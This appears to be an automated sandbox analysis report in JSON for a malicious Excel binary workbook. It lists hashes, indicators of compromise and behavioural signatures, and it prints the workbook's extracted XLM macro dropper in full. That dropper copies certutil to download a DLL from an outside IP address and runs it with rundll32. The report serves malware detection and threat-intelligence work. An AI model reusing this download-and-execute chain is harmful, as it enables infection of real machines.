@@ -1,0 +1,243 @@
+{
+    "analysis": {
+        "score": 10,
+        "tags": [
+            "macro",
+            "xlm"
+        ]
+    },
+    "extracted": [
+        {
+            "dropper": {
+                "language": "xlm4.0",
+                "source": "=CALL(\"Shell32\", \"ShellExecuteA\", \"JCCCCJJ\", 0, \"open\", \"cmd\", \"/c mkdir %programdata%\\TTObk2 && copy /b %SystemRoot%\\System32\\certutil.exe %programdata%\\TTObk2\\TTObk2.exe\", \"0\", 0, 0)\n=CALL(\"Shell32\", \"ShellExecuteA\", \"JCCCCJJ\", 0, \"open\", \"c:\\programdata\\TTObk2\\TTObk2.exe\", \" -urlcache -f -split http://195.123.235.51 c:\\programdata\\TTObk2\\TTObk2.dll\", \"0\", 0, 0)\n=CALL(\"Shell32\", \"ShellExecuteA\", \"JCCCCJJ\", 0, \"open\", \"cmd\", \"/c rundll32 %programdata%\\TTObk2\\TTObk2.dll,StartW\", \"0\", 0, 0)",
+                "urls": null
+            },
+            "tasks": [
+                "behavioral1",
+                "behavioral2"
+            ]
+        }
+    ],
+    "sample": {
+        "completed": "2023-06-26T04:17:08Z",
+        "created": "2023-06-26T04:14:28Z",
+        "id": "230626-etwpvagd23",
+        "md5": "9e1ee4a42c381eabcf2cde38a1aae7c9",
+        "score": 10,
+        "sha1": "015bb306d9e54001d433b3ac2e7212b864f54ae2",
+        "sha256": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3",
+        "sha512": "d8955c76657c68542ebcd1fc0b14b69917976892a2005ff0fcace3754200d52c4557235e083b76f4115cc940281dbe77a8e390e8bd18fbe9d5cdb128191580ec",
+        "size": 125976,
+        "ssdeep": "3072:16qiU1d9aIwln/XDeiNv+6CkSKI30dmA+WR1WK2c:cqiO0RBXD5Nv+B4I3+zlvWK/",
+        "target": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3"
+    },
+    "signatures": [
+        {
+            "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
+            "name": "Process spawned unexpected child process",
+            "score": 10
+        },
+        {
+            "desc": "Office document equipped with 4.0 macros.",
+            "indicators": [
+                {
+                    "resource": "sample",
+                    "yara_rule": "office_xlm_macros"
+                }
+            ],
+            "name": "Suspicious Office macro",
+            "score": 8,
+            "tags": [
+                "macro",
+                "xlm"
+            ]
+        },
+        {
+            "name": "Executes dropped EXE",
+            "score": 7
+        },
+        {
+            "name": "Loads dropped DLL",
+            "score": 7
+        },
+        {
+            "label": "office_macro",
+            "name": "Office loads VBA resources, possible macro or embedded object present",
+            "score": 1
+        },
+        {
+            "desc": "Processor information is often read in order to detect sandboxing environments.",
+            "label": "reg_hw_processor",
+            "name": "Checks processor information in registry",
+            "ttp": [
+                "T1012",
+                "T1082"
+            ]
+        },
+        {
+            "label": "reg_hw_system",
+            "name": "Enumerates system info in registry",
+            "ttp": [
+                "T1012",
+                "T1082"
+            ]
+        },
+        {
+            "label": "modifies_iexplore_settings",
+            "name": "Modifies Internet Explorer settings",
+            "tags": [
+                "adware",
+                "spyware"
+            ],
+            "ttp": [
+                "T1112"
+            ]
+        },
+        {
+            "label": "reg_software_classes",
+            "name": "Modifies registry class"
+        },
+        {
+            "name": "Suspicious behavior: AddClipboardFormatListener"
+        },
+        {
+            "name": "Suspicious use of SetWindowsHookEx"
+        },
+        {
+            "name": "Suspicious use of WriteProcessMemory"
+        }
+    ],
+    "targets": [
+        {
+            "iocs": {
+                "domains": [
+                    "134.121.24.20.in-addr.arpa",
+                    "82.20.109.52.in-addr.arpa",
+                    "64.13.109.52.in-addr.arpa",
+                    "105.193.132.51.in-addr.arpa"
+                ],
+                "ips": [
+                    "195.123.235.51",
+                    "93.184.221.240",
+                    "8.8.8.8",
+                    "20.189.173.12",
+                    "192.229.221.95",
+                    "96.16.110.41",
+                    "8.241.137.254"
+                ]
+            },
+            "md5": "9e1ee4a42c381eabcf2cde38a1aae7c9",
+            "score": 10,
+            "sha1": "015bb306d9e54001d433b3ac2e7212b864f54ae2",
+            "sha256": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3",
+            "sha512": "d8955c76657c68542ebcd1fc0b14b69917976892a2005ff0fcace3754200d52c4557235e083b76f4115cc940281dbe77a8e390e8bd18fbe9d5cdb128191580ec",
+            "signatures": [
+                {
+                    "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
+                    "name": "Process spawned unexpected child process",
+                    "score": 10
+                },
+                {
+                    "name": "Executes dropped EXE",
+                    "score": 7
+                },
+                {
+                    "name": "Loads dropped DLL",
+                    "score": 7
+                },
+                {
+                    "label": "office_macro",
+                    "name": "Office loads VBA resources, possible macro or embedded object present",
+                    "score": 1
+                },
+                {
+                    "desc": "Processor information is often read in order to detect sandboxing environments.",
+                    "label": "reg_hw_processor",
+                    "name": "Checks processor information in registry",
+                    "ttp": [
+                        "T1012",
+                        "T1082"
+                    ]
+                },
+                {
+                    "label": "reg_hw_system",
+                    "name": "Enumerates system info in registry",
+                    "ttp": [
+                        "T1012",
+                        "T1082"
+                    ]
+                },
+                {
+                    "label": "modifies_iexplore_settings",
+                    "name": "Modifies Internet Explorer settings",
+                    "tags": [
+                        "adware",
+                        "spyware"
+                    ],
+                    "ttp": [
+                        "T1112"
+                    ]
+                },
+                {
+                    "label": "reg_software_classes",
+                    "name": "Modifies registry class"
+                },
+                {
+                    "name": "Suspicious behavior: AddClipboardFormatListener"
+                },
+                {
+                    "name": "Suspicious use of SetWindowsHookEx"
+                },
+                {
+                    "name": "Suspicious use of WriteProcessMemory"
+                }
+            ],
+            "size": 125976,
+            "ssdeep": "3072:16qiU1d9aIwln/XDeiNv+6CkSKI30dmA+WR1WK2c:cqiO0RBXD5Nv+B4I3+zlvWK/",
+            "target": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3",
+            "tasks": [
+                "behavioral1",
+                "behavioral2"
+            ]
+        }
+    ],
+    "tasks": {
+        "230626-etwpvagd23-behavioral1": {
+            "backend": "fu1m1",
+            "kind": "behavioral",
+            "name": "behavioral1",
+            "os": "windows7-x64",
+            "resource": "win7-20230621-en",
+            "score": 10,
+            "sigs": 10,
+            "status": "reported",
+            "target": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3.xlsb",
+            "timeout": 150
+        },
+        "230626-etwpvagd23-behavioral2": {
+            "backend": "horse2",
+            "kind": "behavioral",
+            "name": "behavioral2",
+            "os": "windows10-2004-x64",
+            "resource": "win10v2004-20230621-en",
+            "score": 10,
+            "sigs": 7,
+            "status": "reported",
+            "target": "fd71a2fcc0b5dd0fb0dbff257839b67749f2cadf30e2d3dae7f0e941d93d24d3.xlsb",
+            "timeout": 150
+        },
+        "230626-etwpvagd23-static1": {
+            "kind": "static",
+            "name": "static1",
+            "score": 8,
+            "sigs": 1,
+            "status": "reported",
+            "tags": [
+                "macro",
+                "xlm"
+            ]
+        }
+    },
+    "version": "0.2.3"
+}
